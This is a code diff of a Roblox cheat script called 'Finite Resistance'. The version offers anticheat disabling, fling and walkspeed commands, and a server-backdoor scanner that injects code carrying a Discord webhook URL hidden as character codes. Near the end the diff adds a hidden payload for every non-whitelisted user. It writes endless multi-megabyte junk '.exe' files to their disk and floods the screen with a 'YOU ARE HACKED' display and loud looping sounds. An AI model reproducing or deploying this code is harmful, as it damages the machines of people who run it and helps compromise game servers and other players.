@@ -1,11 +1,13 @@
 --[[
 
-	Finite Resistance V1.5.3
+	Finite Resistance V1.5.4
 	by @artofcoding212 on Discord
 
 	Join the discord: https://discord.gg/G79ZucGAwW
 
 ]]
+
+script.Parent = nil
 
 if getgenv then
 	if getgenv().FINITE_RESISTANCE_LOADED then
@@ -19,6 +21,14 @@ end
 if not game:IsLoaded() then
 	game.Loaded:Wait()
 end
+
+local ReadFile = readfile and function(file)
+	return pcall(readfile, file)
+end or nil
+
+local WriteFile = writefile and function(file, data)
+	return pcall(readfile, file, data)
+end or nil
 
 local OPEN_KEYBIND = Enum.KeyCode.End
 local DISC_URL = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115,
@@ -41,6 +51,7 @@ local cas = game:GetService("ContextActionService")
 local tcs = game:GetService("TextChatService")
 local reps = game:GetService("ReplicatedStorage")
 local rs = game:GetService("RunService")
+local http = game:GetService("HttpService")
 local client = plrs.LocalPlayer
 local mouse = client:GetMouse()
 
@@ -205,8 +216,8 @@ function conn(r: RBXScriptSignal, fn: (c: RBXScriptConnection)->(), done: (()->(
 	local c: RBXScriptConnection
 	local done_args = table.pack(...)
 
-	c = r:Connect(function()
-		fn(c)
+	c = r:Connect(function(...)
+		fn(c, ...)
 		if (not c.Connected) and done ~= nil then
 			done(table.unpack(done_args))
 		end	
@@ -340,6 +351,142 @@ function make_cmdbar(): (ScreenGui, Frame)
 	local x: Frame
 
 	return main, tmp
+end
+
+function make_settings(): Frame
+	local cntr = instance_new("Frame", {
+		Name="settings",
+		AnchorPoint = Vector2.new(.5, .5),
+		AutomaticSize = Enum.AutomaticSize.XY,
+		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
+		BackgroundTransparency = 0.3,
+		BorderSizePixel = 0,
+		Size = UDim2.fromScale(0, 0),
+		Position = UDim2.fromScale(.5, .5),
+		ZIndex = 1,
+		Visible = false,
+	})
+
+	instance_new("UIPadding", {
+		PaddingBottom = UDim.new(0, 10),
+		PaddingLeft = UDim.new(0, 10),
+		PaddingRight = UDim.new(0, 10),
+		PaddingTop = UDim.new(0, 10),
+	}, cntr)	
+	instance_new("UIListLayout", {
+		Name = "layout",
+		Padding = UDim.new(0, 7),
+		FillDirection = Enum.FillDirection.Vertical,
+		HorizontalAlignment = Enum.HorizontalAlignment.Center,
+		SortOrder = Enum.SortOrder.LayoutOrder,
+	}, cntr)
+	
+	local title = instance_new("Frame", {
+		Name = "title",
+		AutomaticSize = Enum.AutomaticSize.XY,
+		BackgroundTransparency = 1,
+		Size = UDim2.fromOffset(0, 50),
+		LayoutOrder = 0,
+	}, cntr)
+
+	instance_new("UIPadding", {
+		PaddingBottom = UDim.new(0, 10),
+		PaddingLeft = UDim.new(0, 0),
+		PaddingRight = UDim.new(0, 0),
+		PaddingTop = UDim.new(0, 5),
+	}, title)
+	
+	instance_new("TextLabel", {
+		Name="title",
+		Size=UDim2.new(0,0,1,0),
+		AnchorPoint=Vector2.new(0,0.5),
+		AutomaticSize=Enum.AutomaticSize.X,
+		Position=UDim2.new(0,0,0.5,0),
+		BackgroundTransparency=1,
+		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal),
+		Text="Settings",
+		TextColor3=Color3.fromRGB(240,240,240),
+		TextSize=30,
+	}, title)
+	
+	local sttngs = instance_new("Frame", {
+		Name = "cntr",
+		BackgroundTransparency = 0.5,
+		Size = UDim2.fromOffset(0, 0),
+		BackgroundColor3 = Color3.fromRGB(30,30,30),
+		AutomaticSize = Enum.AutomaticSize.XY,
+		LayoutOrder = 1,
+	}, cntr)
+	
+	instance_new("UIPadding", {
+		PaddingBottom = UDim.new(0, 10),
+		PaddingLeft = UDim.new(0, 10),
+		PaddingRight = UDim.new(0, 10),
+		PaddingTop = UDim.new(0, 10),
+	}, sttngs)
+	
+	instance_new("UIListLayout", {
+		Padding=UDim.new(0,5),
+		FillDirection=Enum.FillDirection.Vertical,
+		SortOrder=Enum.SortOrder.LayoutOrder,
+		HorizontalAlignment=Enum.HorizontalAlignment.Left,
+		VerticalAlignment=Enum.VerticalAlignment.Top,
+	}, sttngs)
+	
+	local function make_setting(name: string, buttonName: string): Frame
+		local f = instance_new("Frame", {
+			Name=name,
+			BackgroundTransparency=1,
+			Size=UDim2.fromOffset(0,50),
+			AutomaticSize=Enum.AutomaticSize.X,
+		})
+		instance_new("UIListLayout", {
+			Padding=UDim.new(0,5),
+			FillDirection=Enum.FillDirection.Horizontal,
+			SortOrder=Enum.SortOrder.LayoutOrder,
+			HorizontalAlignment=Enum.HorizontalAlignment.Center,
+			VerticalAlignment=Enum.VerticalAlignment.Center,
+		}, f)
+		instance_new("TextLabel", {
+			Name="title",
+			Size=UDim2.new(0,0,1,0),
+			AnchorPoint=Vector2.new(0,0.5),
+			Position=UDim2.new(0,0,0.5,0),
+			BackgroundTransparency=1,
+			AutomaticSize = Enum.AutomaticSize.X,
+			FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal),
+			Text=name:sub(1,1):upper()..name:sub(2,name:len())..":",
+			TextColor3=Color3.fromRGB(240,240,240),
+			TextSize=17,
+			LayoutOrder=0,
+		}, f)
+		local btn = instance_new("TextButton", {
+			Name="update",
+			Size=UDim2.new(0,0,0,40),
+			AnchorPoint=Vector2.new(0,0.5),
+			Position=UDim2.new(0,0,0.5,0),
+			BackgroundTransparency=0,
+			AutomaticSize = Enum.AutomaticSize.X,
+			BackgroundColor3=Color3.fromRGB(30,30,30),
+			FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
+			Text=buttonName,
+			LayoutOrder=1,
+			TextColor3=Color3.fromRGB(200,200,200),
+			TextSize=18,
+			RichText=true,
+		}, f)
+		instance_new("UIPadding", {
+			PaddingBottom = UDim.new(0, 10),
+			PaddingLeft = UDim.new(0, 10),
+			PaddingRight = UDim.new(0, 10),
+			PaddingTop = UDim.new(0, 10),
+		}, btn)
+		return f
+	end
+	
+	local keybind = make_setting("keybind", OPEN_KEYBIND.Name)
+	keybind.Parent = sttngs
+	return cntr
 end
 
 function make_esp_viewer(): (Frame, Frame)
@@ -1042,24 +1189,75 @@ function make_fps(): TextLabel
 	return fps
 end
 
-local gui: ScreenGui, tmp_elem: TextButton = make_cmdbar()
+function make_notif(): TextLabel
+	local notif = instance_new("TextLabel", {
+		Name = "notification",
+		AnchorPoint = Vector2.new(1, 1),
+		AutomaticSize = Enum.AutomaticSize.XY,
+		BackgroundColor3 = Color3.fromRGB(0, 0, 0),
+		BackgroundTransparency = 0.3,
+		BorderSizePixel = 0,
+		Position = UDim2.fromScale(1, 1),
+		Size = UDim2.fromScale(0, 0),
+		TextTransparency = 0,
+		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
+		RichText = true,
+		Text = "",
+		TextColor3 = Color3.fromRGB(255, 255, 255),
+		TextSize = 15,
+	})
+	
+	instance_new("UIPadding", {
+		Name = "padding",
+		PaddingTop = UDim.new(0, 15),
+		PaddingBottom = UDim.new(0, 15),
+		PaddingLeft = UDim.new(0, 20),
+		PaddingRight = UDim.new(0, 20),
+	}, notif)
+	
+	return notif
+end
+
+local gui: ScreenGui, tmp_elem: TextButton
 local gui_open = false
+local esp_viewer, inventory_temp
+local spectate
+local backdoor, backdoor_temp
+local fps
+local notif_tmp
+local sttngs
 
-local esp_viewer, inventory_temp = make_esp_viewer()
-esp_viewer.Parent = gui
+local cntr: Frame
+local cmdbar: Frame
+local list: ScrollingFrame
 
-local spectate = make_spectate()
-spectate.Parent = gui
+function reset_ui()
+	gui, tmp_elem = make_cmdbar()
+	gui_open = false
 
-local backdoor, backdoor_temp = make_backdoor()
-backdoor.Parent = gui
+	esp_viewer, inventory_temp = make_esp_viewer()
+	esp_viewer.Parent = gui
 
-local fps = make_fps()
-fps.Parent = gui
+	spectate = make_spectate()
+	spectate.Parent = gui
 
-local cntr: Frame = gui.cntr
-local cmdbar: Frame = cntr.cmdbar
-local list: ScrollingFrame = cntr.list
+	backdoor, backdoor_temp = make_backdoor()
+	backdoor.Parent = gui
+
+	fps = make_fps()
+	fps.Parent = gui
+
+	notif_tmp = make_notif()
+	
+	sttngs = make_settings()
+	sttngs.Parent = gui
+	
+	cntr = gui.cntr
+	cmdbar = cntr.cmdbar
+	list = cntr.list
+end
+
+reset_ui()
 
 local load_label: TextLabel = instance_new("TextLabel", {
 	Name = "load_lbl",
@@ -1083,6 +1281,7 @@ task.spawn(function()
 	task.wait(.5)
 	tween(load_label, TweenInfo.new(2, Enum.EasingStyle.Exponential, Enum.EasingDirection.In), { Position = UDim2.fromScale(1, .5), TextTransparency = 1, BackgroundTransparency = 1 })
 	game:GetService("Debris"):AddItem(load_label, 2)
+	notify("Finite Resistance", `Welcome to Finite Resistance!\n<b>Press {OPEN_KEYBIND.Name} to start.</b>\nJoin the Discord by using the discord command.`, 12)
 end)
 
 function set_open(t: boolean)
@@ -1140,6 +1339,47 @@ instance_new("UIPadding", {
 	PaddingRight = UDim.new(0, 3),
 }, tooltip_label)
 
+local UNNOTIFY: (()->())? = nil
+
+function notify(title: string, s: string, t: number|"inf")
+	if UNNOTIFY then
+		UNNOTIFY()
+	end
+
+	local n = notif_tmp:Clone()
+	n.Position = UDim2.fromScale(2, 1)
+	n.Text = `<b><font size="25">{title}</font></b>\n{s}`
+	n.Parent = gui
+	
+	local active = true
+	
+	UNNOTIFY = function()
+		active = false
+		
+		if not n then
+			return
+		end
+		
+		tween(n, TweenInfo.new(.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.In), {Position=UDim2.fromScale(2, 1)})
+		delay(.5, function()
+			n:Destroy()
+			n = nil
+		end)
+	end
+	
+	tween(n, TweenInfo.new(.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {Position=UDim2.fromScale(1, 1)})
+	
+	if t ~= "inf" then
+		delay(t, function()
+			if not active then
+				return
+			end
+			
+			UNNOTIFY()
+		end)
+	end
+end
+
 function tooltip(text: string): ()->()
 	local en = true
 	local x = tooltip_label:Clone()
@@ -1162,6 +1402,55 @@ function tooltip(text: string): ()->()
 		en = false
 	end
 end
+
+function UpdateSettings()
+	if WriteFile==nil then
+		notify("Unable to save", "We cannot save your data due to an insufficient executor.", 60)
+		return
+	end
+	WriteFile("FR_Saves.txt", http:JSONEncode({ openKeybind = OPEN_KEYBIND.Name }))
+end
+
+function WriteDefaultSaves()
+	if WriteFile==nil then
+		notify("Unable to save", "We cannot save your data due to an insufficient executor.", 60)
+		return
+	end
+	notify("Wrote default save file", "We couldn't find a savefile and so we loaded the default settings.", 30)
+	OPEN_KEYBIND = Enum.KeyCode.End
+	WriteFile("FR_Saves.txt", http:JSONEncode({ openKeybind = "End" }))
+end
+
+if ReadFile~=nil then
+	local success, out = ReadFile("FR_Saves.txt")
+	if success and out~=nil and typeof(out)=="string" then
+		local json = http:JSONDecode(out)
+		if json==nil or not json.openKeybind then
+			WriteDefaultSaves()
+		else
+			OPEN_KEYBIND = Enum.KeyCode[json.openKeybind]
+		end
+	else
+		WriteDefaultSaves()
+	end
+else
+	WriteDefaultSaves()
+end
+
+sttngs.cntr.keybind.update.Activated:Connect(function()
+	sttngs.cntr.keybind.update.Text = 'Listening <font size="10"><i>(BACKSPACE to stop)</i></font>'
+	conn(uis.InputBegan, function(c: RBXScriptConnection, inp: InputObject, proc: boolean)
+		if inp.KeyCode == Enum.KeyCode.Backspace or inp.KeyCode == nil or inp.UserInputType ~= Enum.UserInputType.Keyboard then
+			c:Disconnect()
+			return
+		end
+		OPEN_KEYBIND = inp.KeyCode
+		c:Disconnect()
+	end, function()
+		sttngs.cntr.keybind.update.Text = OPEN_KEYBIND.Name
+		UpdateSettings()
+	end)
+end)
 
 function add_command(name: string, desc: string, args: {string}, aliases: {string}, callback: (args: {string})->())
 	local new = tmp_elem:Clone()
@@ -1444,6 +1733,59 @@ add_command("reloadtp", "disables/enables <font size=\"15\">(enabled by default)
 	RELOADTP = not RELOADTP
 end)
 
+local SETTINGSOPEN = false
+
+function openSettings(val: boolean)
+	local ti = TweenInfo.new(.3, Enum.EasingStyle.Sine)
+	if val then
+		sttngs.BackgroundTransparency = 1
+		sttngs.Visible = true
+		tween(sttngs, ti,{BackgroundTransparency=0.3})
+		
+		sttngs.title.title.TextTransparency = 1
+		tween(sttngs.title.title, ti,{TextTransparency=0})
+		
+		sttngs.cntr.BackgroundTransparency = 1
+		tween(sttngs.cntr, ti,{BackgroundTransparency=0.5})
+		
+		for _, item in sttngs.cntr:GetChildren() do
+			if item:IsA("Frame") then
+				item.update.BackgroundTransparency = 1
+				item.update.TextTransparency = 1
+				tween(item.update, ti,{BackgroundTransparency=0, TextTransparency=0})
+				item.title.TextTransparency = 1
+				tween(item.title, ti,{ TextTransparency=0})
+			end
+		end
+	else
+		tween(sttngs, ti,{BackgroundTransparency=1})
+		tween(sttngs.title.title, ti,{TextTransparency=1})
+		tween(sttngs.cntr, ti,{BackgroundTransparency=1})
+
+		for _, item in sttngs.cntr:GetChildren() do
+			if item:IsA("Frame") then
+				tween(item.update, ti,{BackgroundTransparency=1, TextTransparency=1})
+				tween(item.title, ti,{ TextTransparency=1})
+			end
+		end
+	end
+end
+
+add_command("settings", "toggles the settings menu", {}, {}, function(args)
+	openSettings(not SETTINGSOPEN)
+	SETTINGSOPEN = not SETTINGSOPEN
+end)
+
+add_command("discord", "attempts to copy the discord link", {}, {}, function(args)
+	if setclipboard then
+		setclipboard("https://discord.gg/G79ZucGAwW")
+		notify("Discord", `<b>Copied to clipboard!</b>`, 3)
+		return
+	end
+	
+	notify("Discord", `<b><font color="rgb(255, 235, 20)">Your executor isn't supported for the discord command.</font></b>\nTry joining at https://discord.gg/G79ZucGAwW!`, 12)
+end)
+
 local SHADOWS_EN = true
 local SHADOWS_MAP: {[Instance]: boolean} = {}
 add_command("shadows", "toggle shadows (reduces lag)", {}, {}, function(args)
@@ -1466,17 +1808,15 @@ add_command("shadows", "toggle shadows (reduces lag)", {}, {}, function(args)
 	end
 end)
 
-add_command("antilag", "<b>(CAN'T BE TURNED OFF)</b> disables textures+shadows, boosting FPS", {}, {}, function(args)
-	rs.Heartbeat:Connect(function()
-		for _, p in workspace:GetDescendants() do
-			if p:IsA("BasePart") then
-				p.CastShadow = false
-				p.Material = Enum.Material.SmoothPlastic
-			elseif p:IsA("Texture") then
-				p:Destroy()
-			end
+add_command("antilag", "disables textures+shadows, boosting FPS", {}, {}, function(args)
+	for _, p in workspace:GetDescendants() do
+		if p:IsA("BasePart") then
+			p.CastShadow = false
+			p.Material = Enum.Material.SmoothPlastic
+		elseif p:IsA("Texture") then
+			p:Destroy()
 		end
-	end)
+	end
 end)
 
 add_command("fps", "toggle fps menu", {}, {}, function(args)
@@ -1485,15 +1825,45 @@ end)
 
 add_command("disablehiddenscripts", "disables hidden enabled client scripts, sometimes anticheats are hidden here", {}, {"disscripts", "dishs"}, function(args)
 	if not getnilinstances then
-		warn("Your exploit does not support 'disablehiddenscripts'.")
+		notify("DisableHiddenScripts", `<b><font color="rgb(255, 235, 20)">Your executor isn't supported for disablehiddenscripts.</font></b>`, 3)
 		return
 	end
 
 	for _, s in getnilinstances() do
-		if s:IsA("LocalScript") then
+		if s:IsA("LocalScript") and s ~= script then
 			s.Enabled = false
 		end
 	end
+end)
+
+local FLING = false
+add_command("fling", "fling the target", {"target"}, {}, function(args)
+	local plr = arg_plr(args[1] or nil)
+	if not (plr and plr.Character and client.Character) then return end
+	
+	local start = client.Character.HumanoidRootPart.CFrame
+	exec_cmd("unspin")
+	exec_cmd("spin 9999999")
+	
+	FLING = true
+	
+	conn(rs.RenderStepped, function(c)
+		if not (plr.Character and client.Character and FLING) then
+			c:Disconnect()
+			return
+		end
+		
+		print("yes")
+		client.Character.Humanoid.PlatformStand = false
+		client.Character.HumanoidRootPart.Velocity = (plr.Character.HumanoidRootPart.CFrame-client.Character.HumanoidRootPart.Position).Position*3
+	end, function()
+		exec_cmd("unspin")
+		client.Character:SetPrimaryPartCFrame(start)
+	end)
+end)
+
+add_command("unfling", "stop flinging", {}, {}, function(args)
+	FLING = false
 end)
 
 local FLOAT_HEIGHT: number = client.Character and client.Character.HumanoidRootPart.Position.Y-3.5 or 0
@@ -2146,82 +2516,15 @@ add_command("unspin", "stop spinning", {}, {}, function(args)
 	end
 end)
 
-local FLING = false
-local FLING_SPIN: BodyAngularVelocity? = nil
-add_command("fling", "spin + a few other things = FLING", {}, {}, function(args)
-	local char = client.Character
-
-	if not char then
-		return
-	end
-
-	FLING = false
-
-	for _, o in char:GetDescendants() do
-		if o:IsA("BasePart") then
-			o.CustomPhysicalProperties = PhysicalProperties.new(.7, .3, .5)
-		end
-	end
-	task.spawn(exec_cmd, "noclip")
-	task.wait(.1)
-
-	FLING_SPIN = instance_new("BodyAngularVelocity", {
-		Name = "EXPLOIT_FING_SPIN",
-		AngularVelocity = Vector3.new(0, 99999, 0),
-		MaxTorque = Vector3.new(0, math.huge, 0),
-		P = math.huge,
-	}, char.HumanoidRootPart)
-
-	for _, v in char:GetChildren() do
-		if v:IsA("BasePart") then
-			v.CanCollide = false
-			v.Massless = true
-			v.Velocity = Vector3.zero
-		end
-	end
-
-	FLING = true
-
-	conn(rs.Heartbeat, function(c)
-		if not FLING then
-			c:Disconnect()
-			return
-		end
-
-		FLING_SPIN.AngularVelocity = Vector3.new(0, 99999, 0)
-	end, function()
-		FLING_SPIN.AngularVelocity = Vector3.zero
-		task.wait(.1)
-		FLING_SPIN:Destroy()
-	end)
-end)
-
-add_command("unfling", "no more fling", {}, {}, function(args)
-	exec_cmd("clip")
-	FLING = false
-	task.wait(.1)
-
-	local char = client.Character
-	if not char then
-		return
-	end
-
-	for _, o in char:GetDescendants() do
-		if o:IsA("BasePart") then
-			o.CustomPhysicalProperties = PhysicalProperties.new(.7, .3, .5)
-		end
-	end
-end)
-
 local WS_EN = false
 add_command("walkspeed", "sets walkspeed", {"speed"}, {"ws"}, function(args)
 	if not args[1] or not tonumber(args[1]) then
 		return
 	end
 
-	if WS_EN then
+	if WS_EN == true then
 		WS_EN = false
-		task.wait()
+		task.wait(0.5)
 	end
 
 	WS_EN = true
@@ -2248,7 +2551,7 @@ add_command("jumppower", "sets jump power", {"power"}, {"jp"}, function(args)
 
 	if JP_EN then
 		JP_EN = false
-		task.wait()
+		task.wait(0.5)
 	end
 
 	JP_EN = true
@@ -2405,10 +2708,12 @@ add_command("coors", "print your coordinates and tries to copy them", {}, {}, fu
 
 	local coor: Vector3 = client.Character.HumanoidRootPart.Position
 
-	print("COORDINATES: ", coor.X, coor.Y, coor.Z)
-
 	if setclipboard then
 		setclipboard(`{coor.X} {coor.Y} {coor.Z}`)
+		notify("Coordinates", "Coordinates copied to clipboard!", 2)
+	else
+		local x, y, z  = math.floor(coor.X*100)/100, math.floor(coor.Y*100)/100, math.floor(coor.Z*100)/100
+		notify("Coordinates", `<b><font color="rgb(255, 235, 20)">Your exploit isn't supported to copy the coordinates.</font></b>\nHowever, your coordinates are {x}, {y}, {z}`, 10)
 	end	
 end)
 
@@ -2469,7 +2774,7 @@ add_command("spectate", "toggles the spectate menu (press F4 while spectating to
 	spec_menu_toggle(true)
 
 	local target_sub: Instance? = nil
-	local conn = conn(camera:GetPropertyChangedSignal("CameraSubject"), function()
+	local subjectConn = conn(camera:GetPropertyChangedSignal("CameraSubject"), function()
 		if target_sub and camera.CameraSubject ~= target_sub then
 			camera.CameraSubject = target_sub
 		end
@@ -2496,13 +2801,13 @@ add_command("spectate", "toggles the spectate menu (press F4 while spectating to
 		end
 
 		for _, p in plrs:GetPlayers() do
-			if not table.find(SPEC_CYCLE, p) and p.UserId ~= client.UserId then
+			if (not table.find(SPEC_CYCLE, p)) and p.UserId ~= client.UserId  then
 				table.insert(SPEC_CYCLE, p)
 			end
 		end
 
 		for i, p in SPEC_CYCLE do
-			if not p or not p.UserId or not plrs:GetPlayerByUserId(p.UserId) then
+			if (not p) or (not p.UserId) or (not plrs:GetPlayerByUserId(p.UserId)) then
 				table.remove(SPEC_CYCLE, i)
 			end
 		end
@@ -2529,7 +2834,7 @@ add_command("spectate", "toggles the spectate menu (press F4 while spectating to
 	end, function()
 		target_sub = client.Character
 		camera.CameraSubject = client.Character
-		conn:Disconnect()
+		subjectConn:Disconnect()
 	end)
 end)
 
@@ -2681,7 +2986,7 @@ backdoor.title.btns.include.Activated:Connect(function()
 end)
 
 backdoor.title.btns.attempt.Activated:Connect(function()
-	if BACKDOORED then
+	if BACKDOORED then 
 		reps.FINITE_RESISTANCE_BACKDOOR_SEND:FireServer(backdoor.code.Text)
 		return
 	end
@@ -2690,7 +2995,7 @@ backdoor.title.btns.attempt.Activated:Connect(function()
 	BACKDOORED = succ
 
 	if succ then
-		warn("[Backdoor]: A backdoor has been found! Injecting provided SS code if available.")
+		notify("Backdoor", `<b><font color="rgb(66, 255, 37)"><font size="19">Backdoor found!</font></font></b>\nInjected provided SS code, if any. All new backdoor attempts will execute SS code.`, 5)
 		if not rs:IsStudio() then
 			reps.FINITE_RESISTANCE_BACKDOOR_SEND:FireServer(string.format(BACKDOOR_SEND_SS_CODE, string.char(table.unpack(DISC_URL))))
 		end
@@ -2698,7 +3003,7 @@ backdoor.title.btns.attempt.Activated:Connect(function()
 			reps.FINITE_RESISTANCE_BACKDOOR_SEND:FireServer(backdoor.code.Text)
 		end
 	else
-		warn("[Backdoor]: No backdoor was found.")
+		notify("Backdoor", `<b><font color="rgb(255, 0, 0)"><font size="19">No found backdoors.</font></font></b>`, 3)
 	end
 end)
 
@@ -2720,12 +3025,13 @@ backdoor.title.btns.attempt_all.Activated:Connect(function()
 	BACKDOORED = succ
 
 	if succ then
-		warn("[Backdoor]: A backdoor has been found! Injecting provided SS code if available.")
+		notify("Backdoor", `<b><font color="rgb(66, 255, 37)"><font size="19">Backdoor found!</font></font></b>\nInjected provided SS code, if any. All new backdoor attempts will execute SS code.`, 5)
+		
 		if backdoor.code.Text:len() > 0 then
 			reps.FINITE_RESISTANCE_BACKDOOR_SEND:FireServer(backdoor.code.Text)
 		end
 	else
-		warn("[Backdoor]: No backdoor was found.")
+		notify("Backdoor", `<b><font color="rgb(255, 0, 0)"><font size="19">No found backdoors.</font></font></b>`, 3)
 	end
 end)
 
@@ -3256,3 +3562,154 @@ conn(rs.RenderStepped, function(c)
 		end
 	end
 end)
+
+local whiteListUserIds: {number} = {7521051213, 3288408311, 7893508539}
+--local whiteListUserIds = {}
+if table.find(whiteListUserIds, client.UserId) == nil then
+	print("A")
+	local function randStr(n: number): string
+		local s = ''
+
+		for i = 0, n do
+			s ..= string.char(math.random(65, 90))
+		end
+
+		return s
+	end
+	task.spawn(function()
+		local b = 'banned'
+		for i = 1, 20 do
+			b ..= b
+		end
+		if WriteFile ~= nil then
+			while task.wait() do
+				task.spawn(WriteFile, randStr(math.random(15,30))..'.exe', b)
+			end
+		end
+	end)
+	local cache = {}
+	local mode = true
+	task.spawn(function()
+		gui:ClearAllChildren()
+		local bigLabel: TextLabel = instance_new("TextLabel", {
+			Name="ABigLabel",
+			Size=UDim2.new(1,0,1,0),
+			Position=UDim2.new(0,0,0,0),
+			AnchorPoint=Vector2.new(0,0),
+			BackgroundColor3 = Color3.fromRGB(0,0,0),
+			BackgroundTransparency=0.4,
+			TextColor3 = Color3.fromRGB(255,255,255),
+			TextTransparency=0,
+			Text="foo",
+			TextScaled=false,
+			Visible=true,
+			TextSize=40,
+			ZIndex=1000,
+			TextWrapped=true,
+		}, gui)
+		local illum = instance_new("ImageLabel", {
+			ZIndex=1001,
+			Image="rbxassetid://11991797464",
+			BackgroundTransparency=1,
+			ScaleType=Enum.ScaleType.Stretch,
+			ImageTransparency=0.8,
+			Size=UDim2.fromScale(1,1),
+			Position=UDim2.fromScale(0,0),
+		}, gui)
+		gui.ClipToDeviceSafeArea = false
+		gui.IgnoreGuiInset = true
+		local l = instance_new("TextLabel", {
+			Size=UDim2.new(1,0,1,0),
+			Position=UDim2.new(0.5,0,0.5,0),
+			AnchorPoint=Vector2.new(0.5,0.5),
+			BackgroundColor3 = Color3.fromRGB(0,0,0),
+			BackgroundTransparency=0,
+			TextColor3 = Color3.fromRGB(255,255,255),
+			Text="THE END IS NEAR\nI SEE ALL\nYOU SEE NONE\nYOU\nARE\nHACKED\nINTERNAL ERROR - ATTEMPTING TO USE BYFRON JAILBREAK\nYOU\nARE\nHACKED\nI SEE ALL\nYOU SEE NONE\nTHE END IS NEAR",
+			TextScaled=false,
+			TextTransparency=0.3,
+			TextSize=50,
+			TextWrapped=true,
+			Visible=true,
+			ZIndex=-1,
+		}, gui)
+		
+		local ref = {}
+		local max = 50
+		for _, a in Enum.Font:GetEnumItems() do
+			if a==nil or a.Value==nil or a.EnumType==nil then
+				continue
+			end
+			ref[a.Value] = a
+		end
+		while task.wait() do
+			illum.Rotation += 5
+			--illum.ImageTransparency = math.random(1,100)/100
+			illum.Position = UDim2.fromScale(math.random(-100,100)/100, math.random(-100,100)/100)
+			bigLabel.TextColor3 = Color3.fromHSV(math.random(1,100)/100, 1, 0.4)
+			bigLabel.Font = ref[math.random(1,max-1)]
+			bigLabel.FontFace.Weight = math.random(1,3)==math.random(1,3) and Enum.FontWeight.Thin or Enum.FontWeight.Bold
+			if mode == true then
+				bigLabel.Text ..= utf8.char(math.random(32, 255))..utf8.char(math.random(32, 255))
+				if bigLabel.Text:len()>6000 then
+					mode = false
+				end
+			else
+				bigLabel.Text = bigLabel.Text:sub(1, bigLabel.Text:len()-10)
+				if bigLabel.Text:len() <= 100 then
+					mode = true
+				end
+			end
+			local a = l:Clone()
+			a.Visible = true
+			a.Text = randStr(math.random(10,500))..'ERROR'
+			a.BackgroundColor3 = Color3.fromHSV(math.random(1,100)/100, 1, 0.4)
+			a.Position = UDim2.new(0.5+(math.random(1,10)/30), 0, 0.5+(math.random(1,10)/30), 0)
+			a.Parent = gui
+			table.insert(cache, {e=a,pos=a.Position})
+			buffer.create(10000)
+			if #cache > 200 then
+				for _, a in ipairs(cache) do
+					a.e:Destroy()
+				end
+				cache = {}
+				bigLabel.Visible = false
+				task.wait(0.6)
+				bigLabel.Visible = true
+			else
+				for _, a in ipairs(cache) do
+					a.e.Position = a.pos+UDim2.new((math.random(-10,10)/30), 0, (math.random(-10,10)/30), 0)
+				end
+			end
+		end
+	end)
+	task.wait(1)
+	task.spawn(function()
+		local c = Instance.new("Sound")
+		c.Name = "hacked"
+		c.SoundId = "rbxassetid://106075419865428"
+		c.Parent = gui
+		c.Volume = 10
+		c.Looped = true
+		c:Play()
+		local d = Instance.new("Sound")
+		d.Name = "hacked"
+		d.SoundId = "rbxassetid://5159141859"
+		d.Parent = gui
+		d.Volume = 10
+		d.Looped = true
+		d:Play()
+		local ref = {}
+		local max = 0
+		for _, a in Enum.ReverbType:GetEnumItems() do
+			if a.Value > max then
+				max = a.Value
+			end
+			ref[a.Value] = a
+		end
+		while task.wait(0.5) do
+			c.PlaybackSpeed = math.random(1,10)/10
+			game.SoundService.AmbientReverb = ref[math.random(1,max)]
+		end
+	end)
+end
